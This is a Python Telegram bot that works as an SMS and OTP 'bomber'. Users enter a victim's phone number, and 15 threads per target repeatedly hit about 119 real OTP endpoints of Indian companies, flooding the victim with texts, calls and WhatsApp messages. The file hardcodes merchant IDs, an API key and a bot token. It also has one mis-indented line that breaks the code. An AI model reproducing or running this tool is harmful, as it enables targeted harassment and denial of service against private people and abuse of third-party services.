# developed by idk but enchanted by rootxindia ;)
import asyncio
import json
import os
import random
import threading
import time
import requests
from telegram import Update, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes, filters, CallbackQueryHandler 

ADMIN_ID = 731935160
JSON_FILE = "list_number.json"
DEFAULT_COUNTRY_CODE = "91"
BOMBING_DELAY_SECONDS = 0.4 
MAX_BOMBING_PER_USER = 6
THREAD_COUNT = 15 

bombing_active = {}
session = requests.Session()

def load_db():
    if not os.path.exists(JSON_FILE): return {}
    try:
        with open(JSON_FILE, "r", encoding="utf-8") as f: return json.load(f)
    except: return {}

def save_db(data):
    with open(JSON_FILE, "w", encoding="utf-8") as f: json.dump(data, f, indent=4)

def getapi(pn, index, cc):
    try:
        # Standard GET APIs
        if index == 0:
            return session.get(f"https://www.oyorooms.com/api/pwa/generateotp?country_code=%2B{cc}&nod=4&phone={pn}", timeout=5).status_code == 200
        elif index == 1:
            return session.get(f"https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo={pn}", timeout=5).status_code == 200
        elif index == 2:
            return session.get(f"https://securedapi.confirmtkt.com/api/platform/register?mobileNumber={pn}", timeout=5).status_code == 200
        
        # POST APIs
        elif index == 3: # PharmEasy
            return session.post('https://pharmeasy.in/api/auth/requestOTP', json={"contactNumber":pn}, timeout=5).status_code == 200
        elif index == 4: # Hero MotoCorp
            return session.post('https://www.heromotocorp.com/en-in/xpulse200/ajax_data.php', data={'mobile_no': pn, 'csrf': '523bc3fa1857c4df95e4d24bbd36c61b'}, timeout=5).status_code == 200
        elif index == 5: # IndiaLends
            return session.post("https://indialends.com/internal/a/otp.ashx", data={'log_mode': '1', 'ctrl': pn}, timeout=5).status_code == 200
        elif index == 6: # Flipkart 1
            return session.post('https://www.flipkart.com/api/6/user/signup/status', json={"loginId":[f"+{cc}{pn}"],"supportAllStates":True}, timeout=5).status_code == 200
        elif index == 7: # Flipkart 2
            return session.post('https://www.flipkart.com/api/5/user/otp/generate', data={'loginId': f'+{cc}{pn}', 'state': 'VERIFIED'}, timeout=5).status_code == 200
        elif index == 8: # Lenskart
            return session.post('https://www.ref-r.com/clients/lenskart/smsApi', data={'mobile': pn, 'submit': '1'}, timeout=5).status_code == 200
        elif index == 9: # Practo
            return session.post("https://accounts.practo.com/send_otp", data={'client_name': 'Practo Android App', 'mobile': f'+{cc}{pn}'}, timeout=5).status_code == 200
        elif index == 10: # PizzaHut
            return session.post('https://m.pizzahut.co.in/api/cart/send-otp?langCode=en', json={"customer":{"MobileNo":pn,"merchantId":"98d18d82-ba59-4957-9c92-3f89207a34f6"}}, timeout=5).status_code == 200
        elif index == 11: # Goibibo
            return session.post('https://www.goibibo.com/common/downloadsms/', data={'mbl': pn}, timeout=5).status_code == 200
        elif index == 12: # Apollo Pharmacy
            return "sent" in session.post('https://www.apollopharmacy.in/sociallogin/mobile/sendotp/', data={'mobile': pn}, timeout=5).text.lower()
        elif index == 13: # Ajio
            return '"statusCode":"1"' in session.post('https://www.ajio.com/api/auth/signupSendOTP', json={"mobileNumber":pn,"requestType":"SENDOTP"}, timeout=5).text
        elif index == 14: # AltBalaji
            return session.post('https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN', json={"country_code":cc,"phone_number":pn}, timeout=5).status_code == 200
        elif index == 15: # Aala
            return 'code:' in session.post('https://www.aala.com/accustomer/ajax/getOTP', data={'email': f'{cc}{pn}', 'firstname': 'SpeedX'}, timeout=5).text
        elif index == 16: # Grab
            return session.post('https://api.grab.com/grabid/v1/phone/otp', data={'method': 'SMS', 'countryCode': 'id', 'phoneNumber': f'{cc}{pn}'}, timeout=5).status_code == 200
        elif index == 17: # GheeAPI
            return session.post("https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", headers={"gk-merchant-id": "19g6im8srkz9y"}, json={"phone": pn, "country": "IN"}, timeout=5).status_code == 200
        elif index == 18: # EdzAPI
            return session.post("https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", headers={"gk-merchant-id": "19an4fq2kk5y"}, json={"phone": pn, "country": "IN"}, timeout=5).status_code == 200
        elif index == 19: # FalconAPI
            return session.post("https://api.breeze.in/session/start", json={"phoneNumber": pn, "countryCode": f"+{cc}"}, timeout=5).status_code == 200
        elif index == 20: # NeclesAPI
            return session.post("https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", headers={"gk-merchant-id": "19g6ilhej3mfc"}, json={"phone": pn, "country": "IN"}, timeout=5).status_code == 200
        elif index == 21: # KisanAPI
            return session.post("https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", json={"mobile_number": pn, "client_id": "kisan-app"}, timeout=5).status_code == 200
        elif index == 22: # PWAPI
            return session.post("https://api.penpencil.co/v1/users/resend-otp?smsType=2", json={"mobile": pn, "organizationId": "5eb393ee95fab7468a79d189"}, timeout=5).status_code == 200
        elif index == 23: # Khatabook
            return session.post("https://api.khatabook.com/v1/auth/request-otp", headers={"x-kb-app-name": "Khatabook Website"}, json={"country_code": f"+{cc}", "phone": pn}, timeout=5).status_code == 200
        elif index == 24: # Jockey
            return session.get(f"https://www.jockey.in/apps/jotp/api/login/send-otp/+{cc}{pn}?whatsapp=true", timeout=5).status_code == 200
        elif index == 25: # Fasiin
            return session.post("https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", headers={"gk-merchant-id": "19kc37zcdyiu"}, json={"phone": pn, "country": "IN"}, timeout=5).status_code == 200
        elif index == 26: # VidyaKul
            return session.post('https://vidyakul.com/signup-otp/send', data={'phone': pn, 'rcsconsent': 'true'}, timeout=5).status_code == 200
        elif index == 27: # Aditya Birla
            return session.post('https://oneservice.adityabirlacapital.com/apilogin/onboard/generate-otp', headers={'source': '151'}, json={'request':'CepT08jilRIQiS1EpaNsQVXbRv3PS/eUQ1lAbKfLJuUNvkkemX01P9n5tJiwyfDP3eEXRcol6uGvIAmdehuWBw=='}, timeout=5).status_code == 200
        elif index == 28: # Pinknblu
            return session.post('https://pinknblu.com/v1/auth/generate/otp', data={'country_code': f'+{cc}', 'phone': pn}, timeout=5).status_code == 200
        elif index == 29: # Udaan
            return session.post('https://auth.udaan.com/api/otp/send?client_id=udaan-v2', data={'mobile': pn}, timeout=5).status_code == 200
        elif index == 30: # Nuvama Wealth
            return session.post('https://nwaop.nuvamawealth.com/mwapi/api/Lead/GO', headers={'api-key': 'c41121ed-b6fb-c9a6-bc9b-574c82929e7e'}, json={"contactInfo": pn, "mode": "SMS"}, timeout=5).status_code == 200

        elif index == 31: # Hungama
            return session.post("https://communication.api.hungama.com/v1/communication/otp", json={"mobileNo": pn, "countryCode": f"+{cc}", "appCode": "un"}, timeout=5).status_code == 200
        elif index == 32: # ConfirmTkt
            return session.get(f"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={pn}&newOtp=true", timeout=5).status_code == 200
        elif index == 33: # Swiggy
            return session.post("https://profile.swiggy.com/api/v3/app/request_call_verification", json={"mobile": pn}, timeout=5).status_code == 200
        elif index == 34: # NoBroker
            return session.post("https://www.nobroker.in/api/v3/account/otp/send", data={"phone": pn, "countryCode": "IN"}, timeout=5).status_code == 200
        elif index == 35: # Allen Live
            return session.post("https://api.allen-live.in/api/v1/auth/sendOtp", json={"country_code": cc, "phone_number": pn, "persona_type": "STUDENT"}, timeout=5).status_code == 200
        elif index == 36: # Physics Wallah
            return session.post("https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189?smsType=0", json={"mobile": pn, "countryCode": f"+{cc}"}, timeout=5).status_code == 200
        elif index == 37: # Zomato
            return session.post("https://www.zomato.com/php/o2o_api/forgot_password", data=f"phone={pn}&country_code={cc}", timeout=5).status_code == 200
        elif index == 38: # Swiggy DAPI
            return session.post("https://www.swiggy.com/dapi/auth/sms", json={"mobile": pn}, timeout=5).status_code == 200
        elif index == 39: # Flipkart Rome
            return session.post("https://rome.api.flipkart.com/api/7/user/otp/generate", json={"loginId": f"+{cc}{pn}"}, timeout=5).status_code == 200
        elif index == 40: # Lenskart V2
            return session.post("https://api.lenskart.com/v2/customers/sendOtp", json={"telephone": pn}, timeout=5).status_code == 200
        elif index == 41: # Justdial
            return session.post("https://www.justdial.com/functions/whatsappverification.php", data=f"mob={pn}&vcode=&rsend=0&name=deV", timeout=5).status_code == 200
        elif index == 42: # IndiaLends v2
            return session.post("https://indialends.com/internal/a/otp.ashx", data=f"log_mode=1&ctrl={pn}", timeout=5).status_code == 200
        elif index == 43: # Apollo v2
            return session.post("https://www.apollopharmacy.in/sociallogin/mobile/sendotp", data=f"mobile={pn}", timeout=5).status_code == 200
        elif index == 44: # Magicbricks
            return session.post("https://accounts.magicbricks.com/userauth/api/validate-mobile", data=f"ubimobile={pn}", timeout=5).status_code == 200
        elif index == 45: # Tata Capital
            return session.post("https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", json={"phone": pn, "isOtpViaCallAtLogin": "true"}, timeout=5).status_code == 200
        elif index == 46: # Hungama v2
            return session.post("https://communication.api.hungama.com/v1/communication/otp", json={"mobileNo": pn, "templateCode": 1}, timeout=5).status_code == 200
        elif index == 47: # Meru Cabs
            return session.post("https://merucabapp.com/api/otp/generate", data=f"mobile_number={pn}", timeout=5).status_code == 200
        elif index == 48: # Doubtnut
            return session.post("https://api.doubtnut.com/v4/student/login", json={"phone_number": pn, "udid": "b751fb63c0ae17ba"}, timeout=5).status_code == 200
        elif index == 49: # NoBroker v2
            return session.post("https://www.nobroker.in/api/v3/account/otp/send", data=f"phone={pn}&countryCode=IN", timeout=5).status_code == 200
        elif index == 50: # Tata Voice v2
            return session.post("https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", json={"phone": pn}, timeout=5).status_code == 200
        elif index == 51: # Hungama SMS
            return session.post("https://communication.api.hungama.com/v1/communication/otp", json={"mobileNo": pn, "appCode": "un"}, timeout=5).status_code == 200
        elif index == 52: # ShipRocket
            return session.post("https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", json={"mobileNumber": pn}, timeout=5).status_code == 200
        elif index == 53: # Country Delight
            return session.post("https://api.countrydelight.in/api/auth/new_request_otp", json={"new_user": True, "mobile_no": pn}, timeout=5).status_code == 200
        elif index == 54: # Swiggy Call v2
            return session.post("https://profile.swiggy.com/api/v3/app/request_call_verification", json={"mobile": pn}, timeout=5).status_code == 200
        elif index == 55: # KPN Fresh
            return session.post("https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB", json={"phone_number": {"number": pn, "country_code": "+91"}}, timeout=5).status_code == 200
        elif index == 56: # 1MG Call
            return session.post("https://www.1mg.com/auth_api/v6/create_token", json={"number": pn, "otp_on_call": True}, timeout=5).status_code == 200
        elif index == 57: # Swiggy Call v3
            return session.post("https://profile.swiggy.com/api/v3/app/request_call_verification", json={"mobile": pn}, timeout=5).status_code == 200
        elif index == 58: # Jockey Resend
            return session.get(f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{pn}?whatsapp=true", timeout=5).status_code == 200
        elif index == 59: # Hungama v5
            return session.post("https://communication.api.hungama.com/v1/communication/otp", json={"mobileNo": pn, "device": "web"}, timeout=5).status_code == 200
        elif index == 60: # PenPencil v2
            return session.post("https://api.penpencil.co/v1/users/resend-otp?smsType=1", json={"organizationId": "5eb393ee95fab7468a79d189", "mobile": pn}, timeout=5).status_code == 200
            
        elif index == 61: # Dayco India
            return session.post("https://ekyc.daycoindia.com/api/nscript_functions.php", data=f"api=send_otp&brand=dayco&mob={pn}&resend_otp=resend_otp", timeout=5).status_code == 200
        elif index == 62: # Lending Plate
            return session.post("https://lendingplate.com/api.php", data=f"mobiles={pn}&resend=Resend", timeout=5).status_code == 200
        elif index == 63: # Univest
            return session.get(f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={pn}", timeout=5).status_code == 200
        elif index == 64: # Smytten
            return session.post("https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", json={"phone": pn, "email": "test@example.com"}, timeout=5).status_code == 200
        elif index == 65: # Breeze API v2
            return session.post("https://api.breeze.in/session/start", json={"phoneNumber": pn, "authVerificationType": "otp", "countryCode": "+91"}, timeout=5).status_code == 200
        elif index == 66: # PW Live v2
            return session.post("https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189?smsType=0", json={"mobile": pn, "countryCode": "+91", "subOrgId": "SUB-PWLI000"}, timeout=5).status_code == 200
        elif index == 67: # KPN WhatsApp
            return session.post("https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6", json={"notification_channel": "WHATSAPP", "phone_number": {"country_code": "+91", "number": pn}}, timeout=5).status_code == 200
        elif index == 68: # KPN WhatsApp v2
            return session.post("https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6", json={"notification_channel": "WHATSAPP", "phone_number": {"country_code": "+91", "number": pn}}, timeout=5).status_code == 200
        elif index == 69: # Hungama v6
            return session.post("https://communication.api.hungama.com/v1/communication/otp", json={"mobileNo": pn, "countryCode": "+91", "appCode": "un", "device": "web"}, timeout=5).status_code == 200
        elif index == 70: # MyHubble Money
            return session.post("https://api.myhubble.money/v1/auth/otp/generate", json={"phoneNumber": pn, "channel": "SMS"}, timeout=5).status_code == 200
        elif index == 71: # Tata Capital Business
            return session.post("https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp", json={"mobileNumber": pn, "deviceOs": "Android"}, timeout=5).status_code == 200
        elif index == 72: # Snapmint
            return session.post("https://api.snapmint.com/v1/public/sign_up", json={"phone": pn}, timeout=5).status_code == 200
        elif index == 73: # Housing.com
            return session.post("https://login.housing.com/api/v2/send-otp", json={"phone": pn, "country_url_name": "in"}, timeout=5).status_code == 200
        elif index == 74: # PenPencil v3
            return session.post("https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348", json={"mobile": pn}, timeout=5).status_code == 200
        elif index == 75: # Entri
            return session.post("https://entri.app/api/v3/users/check-phone/", json={"phone": pn}, timeout=5).status_code == 200
        elif index == 76: # A23 Games
            return session.post("https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2", json={"mobile": pn, "device_id": "android123"}, timeout=5).status_code == 200
        elif index == 77: # Lifestyle Stores
            return session.post("https://www.lifestylestores.com/in/en/mobilelogin/sendOTP", json={"signInMobile": pn, "channel": "sms"}, timeout=5).status_code == 200
        elif index == 78: # WorkIndia
            return session.get(f"https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={pn}&version_number=623", timeout=5).status_code == 200
        elif index == 79: # PokerBaazi
            return session.post("https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp", json={"mobile": pn, "mfa_channels": "phno"}, timeout=5).status_code == 200
        elif index == 80: # MamaEarth
            return session.post("https://auth.mamaearth.in/v1/auth/initiate-signup", json={"mobile": pn}, timeout=5).status_code == 200
        elif index == 81: # Goibibo Voice
            return session.post("https://www.goibibo.com/user/voice-otp/generate/", json={"phone": pn}, timeout=5).status_code == 200
        elif index == 82: # Jockey WhatsApp v2
            return session.get(f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{pn}?whatsapp=true", timeout=5).status_code == 200
        elif index == 83: # Hungama v7
            return session.post("https://communication.api.hungama.com/v1/communication/otp", json={"mobileNo": pn, "countryCode": "+91", "device": "web"}, timeout=5).status_code == 200
        elif index == 84: # PenPencil v4
            return session.post("https://api.penpencil.co/v1/users/resend-otp?smsType=1", json={"organizationId": "5eb393ee95fab7468a79d189", "mobile": pn}, timeout=5).status_code == 200
        elif index == 85: # Dayco India v2
            return session.post("https://ekyc.daycoindia.com/api/nscript_functions.php", data=f"api=send_otp&brand=dayco&mob={pn}&resend_otp=resend_otp", timeout=5).status_code == 200
        elif index == 86: # Lending Plate v2
            return session.post("https://lendingplate.com/api.php", data=f"mobiles={pn}&resend=Resend", timeout=5).status_code == 200
        elif index == 87: # Univest v2
            return session.get(f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={pn}", timeout=5).status_code == 200
        elif index == 88: # Smytten v2
            return session.post("https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", json={"phone": pn, "email": "test@example.com"}, timeout=5).status_code == 200
        elif index == 89: # GoPink Cabs
            return session.post("https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php", data=f"check_mobile_number=1&contact={pn}", timeout=5).status_code == 200
        elif index == 90: # Goibibo Voice v2
            return session.post("https://www.goibibo.com/user/voice-otp/generate/", json={"phone": pn}, timeout=5).status_code == 200
            
         elif index == 91: # KPN WhatsApp v3
            return session.post("https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6", json={"notification_channel": "WHATSAPP", "phone_number": {"country_code": "+91", "number": pn}}, timeout=5).status_code == 200
        elif index == 92: # Jockey WhatsApp v3
            return session.get(f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{pn}?whatsapp=true", timeout=5).status_code == 200
        elif index == 93: # Hungama SMS v2
            return session.post("https://communication.api.hungama.com/v1/communication/otp", json={"mobileNo": pn, "countryCode": "+91", "device": "web"}, timeout=5).status_code == 200
        elif index == 94: # Dayco India SMS
            return session.post("https://ekyc.daycoindia.com/api/nscript_functions.php", data=f"api=send_otp&brand=dayco&mob={pn}&resend_otp=resend_otp", timeout=5).status_code == 200
        elif index == 95: # Lending Plate SMS
            return session.post("https://lendingplate.com/api.php", data=f"mobiles={pn}&resend=Resend", timeout=5).status_code == 200
        elif index == 96: # Univest SMS
            return session.get(f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={pn}", timeout=5).status_code == 200
        elif index == 97: # Smytten SMS
            return session.post("https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", json={"phone": pn, "email": "test@example.com"}, timeout=5).status_code == 200
        elif index == 98: # ServeTel
            return session.post("https://api.servetel.in/v1/auth/otp", data=f"mobile_number={pn}", timeout=5).status_code == 200
        elif index == 99: # GoPink Cabs SMS
            return session.post("https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php", data=f"check_mobile_number=1&contact={pn}", timeout=5).status_code == 200
        elif index == 100: # MyHubble Money SMS
            return session.post("https://api.myhubble.money/v1/auth/otp/generate", json={"phoneNumber": pn, "channel": "SMS"}, timeout=5).status_code == 200
        elif index == 101: # Tata Capital Business SMS
            return session.post("https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp", json={"mobileNumber": pn, "deviceOs": "Android"}, timeout=5).status_code == 200
        elif index == 102: # Snapmint SMS
            return session.post("https://api.snapmint.com/v1/public/sign_up", json={"phone": pn}, timeout=5).status_code == 200
        elif index == 103: # Housing.com SMS
            return session.post("https://login.housing.com/api/v2/send-otp", json={"phone": pn, "country_url_name": "in"}, timeout=5).status_code == 200
        elif index == 104: # PenPencil V3 SMS
            return session.post("https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348", json={"mobile": pn}, timeout=5).status_code == 200
        elif index == 105: # Entri SMS
            return session.post("https://entri.app/api/v3/users/check-phone/", json={"phone": pn}, timeout=5).status_code == 200
        elif index == 106: # A23 Games v2
            return session.post("https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2", json={"mobile": pn, "device_id": "android123"}, timeout=5).status_code == 200
        elif index == 107: # Lifestyle Stores v2
            return session.post("https://www.lifestylestores.com/in/en/mobilelogin/sendOTP", json={"signInMobile": pn, "channel": "sms"}, timeout=5).status_code == 200
        elif index == 108: # WorkIndia v2
            return session.get(f"https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={pn}&version_number=623", timeout=5).status_code == 200
        elif index == 109: # PokerBaazi v2
            return session.post("https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp", json={"mobile": pn, "mfa_channels": "phno"}, timeout=5).status_code == 200
        elif index == 110: # MamaEarth v2
            return session.post("https://auth.mamaearth.in/v1/auth/initiate-signup", json={"mobile": pn}, timeout=5).status_code == 200
        elif index == 111: # Wellness Forever
            return session.post("https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer", data=f'method=firstRegisterApi&data={{"customerMobile":"{pn}","generateOtp":"true"}}', timeout=5).status_code == 200
        elif index == 112: # HealthMug
            return session.post("https://api.healthmug.com/account/createotp", json={"mobile": pn}, timeout=5).status_code == 200
        elif index == 113: # Vyapar
            return session.get(f"https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={pn}", timeout=5).status_code == 200
        elif index == 114: # CodFirm
            return session.get(f"https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{pn}&storeUrl=bellavita1.myshopify.com", timeout=5).status_code == 200
        elif index == 115: # Swipe
            return session.post("https://app.getswipe.in/api/user/mobile_login", json={"mobile": pn, "resend": True}, timeout=5).status_code == 200
        elif index == 116: # Country Delight v2
            return session.post("https://api.countrydelight.in/api/v1/customer/requestOtp", json={"mobile": pn, "platform": "Android", "mode": "new_user"}, timeout=5).status_code == 200
        elif index == 117: # AstroSage
            return session.get(f"https://vartaapi.astrosage.com/sdk/registerAS?operation_name=signup&countrycode=91&phoneno={pn}", timeout=5).status_code == 200
        elif index == 118: # Mpokket
            return session.post("https://web-api.mpokket.in/registration/sendOtp", json={"mobile": pn}, timeout=5).status_code == 200

        return False
    except:
        return False
        

def bombing_worker(user_id, task_id, phone, cc):
    while True:
        user_tasks = bombing_active.get(user_id, {})
        task = user_tasks.get(task_id)
        if not task or not task["active"]: break
        getapi(phone, random.randint(0, 118), cc)
        task["count"] += 1
        time.sleep(BOMBING_DELAY_SECONDS)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [["🔥 Start Bombing", "🛑 Stop Bombing"], ["➕ Add More to List"]]
    await update.message.reply_text("<b>Welcome! Choose an option:</b>", reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True), parse_mode="HTML")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text
    if text == "➕ Add More to List":
        context.user_data["state"] = "AWAIT_NUM"
        await update.message.reply_text("🎯 <b>Enter the 10-digit target phone number:</b>", parse_mode="HTML")
        return
    if context.user_data.get("state") == "AWAIT_NUM":
        if text.isdigit() and len(text) == 10:
            context.user_data["state"] = None
            if user_id not in bombing_active: bombing_active[user_id] = {}
            task_id = len(bombing_active[user_id]) + 1
            bombing_active[user_id][task_id] = {"phone": text, "active": True, "count": 0}
            for _ in range(THREAD_COUNT):
                threading.Thread(target=bombing_worker, args=(user_id, task_id, text, DEFAULT_COUNTRY_CODE), daemon=True).start()
            await update.message.reply_text(f"✅ Bombing started for <code>{text}</code> (Task #{task_id})", parse_mode="HTML")
        return
    elif text == "🛑 Stop Bombing":
        user_tasks = bombing_active.get(user_id, {})
        active_tasks = {tid: data for tid, data in user_tasks.items() if data["active"]}
        if not active_tasks:
            await update.message.reply_text("No active tasks.")
            return
        keyboard = [[InlineKeyboardButton(f"{tid}:{data['phone']} ✅", callback_data=f"stop_{tid}")] for tid, data in active_tasks.items()]
        await update.message.reply_text("<b>Select a task to stop:</b>", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML")

async def stop_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    task_id = int(update.callback_query.data.split("_")[1])
    if user_id in bombing_active and task_id in bombing_active[user_id]:
        bombing_active[user_id][task_id]["active"] = False
        await update.callback_query.edit_message_text(f"🛑 Stopped.")
    await update.callback_query.answer()

def main():
    app = ApplicationBuilder().token("8942825096:AAEFgLdIx2U_AfzCmKplMH4rnrFkR3wRC5U").build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(stop_callback, pattern="^stop_"))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.run_polling()

if __name__ == "__main__":
    main()
